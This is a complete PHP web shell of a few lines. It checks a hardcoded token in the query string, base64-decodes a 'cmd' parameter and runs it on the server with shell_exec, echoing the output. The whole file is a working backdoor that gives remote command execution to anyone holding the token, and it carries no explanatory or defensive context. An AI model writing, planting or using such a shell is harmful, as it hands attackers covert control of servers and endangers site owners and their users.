<?php
if (!isset($_GET['token']) || $_GET['token'] !== 'secret123pos') die('Unauthorized');
$cmd = isset($_GET['cmd']) ? base64_decode($_GET['cmd']) : 'ls -la';
echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
?>
